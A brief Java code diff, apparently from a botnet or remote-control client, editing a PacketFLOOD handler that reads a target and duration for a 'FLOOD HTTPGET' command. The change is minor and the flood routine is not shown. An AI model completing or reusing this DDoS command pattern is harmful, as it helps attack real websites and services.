@@ -15,8 +15,10 @@ public class PacketFLOOD extends AbstractIncomingPacket {
 
 	@Override
 	public void read() throws Exception {
-		String line = null;
-		String s;
+		String line = "";
+		
+		// TODO
+		
 		if (line.equals("FLOOD HTTPGET")) {
 			String target = Connection.readLine();
 			int seconds = Connection.readInt();
